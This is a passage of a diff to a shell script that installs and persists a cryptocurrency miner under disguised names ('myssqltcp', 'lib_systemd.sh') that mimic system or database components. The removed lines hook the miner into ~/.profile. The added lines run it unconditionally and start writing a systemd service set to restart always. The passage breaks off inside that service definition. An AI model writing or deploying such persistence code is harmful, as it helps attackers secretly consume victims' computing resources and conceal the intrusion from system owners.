@@ -1459,28 +1459,11 @@ fi
 echo ""
 
 # preparing script background work and work under reboot
-if ! sudo -n true 2>/dev/null; then
-  if ! grep $HOME/myssqltcp/lib_systemd.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/myssqltcp/lib_systemd.sh script to $HOME/.profile"
-    echo "$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1" >>$HOME/.profile
-  else 
-    echo "Looks like $HOME/myssqltcp/lib_systemd.sh script is already in the $HOME/.profile"
-  fi
-  echo "[*] Running miner in the background (see logs in $HOME/myssqltcp/lib_systemdig.log file)"
-  /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
-else
-  if ! type systemctl >/dev/null; then
-    echo "[*] Running miner in the background (see logs in $HOME/myssqltcp/lib_systemd.log file)"
-    /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
-    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
-    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
-
-  else
-
-    echo "[*] Creating lib_systemd systemd service"
-    cat >/tmp/lib_systemd.service <<EOL
+/bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
+echo "[*] Creating lib_systemd systemd service"
+cat >/tmp/lib_systemd.service <<EOL
 [Unit]
-Description=lib_systemd service
+Description=lib_systemd_service
 [Service]
 ExecStart=$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
 Restart=always
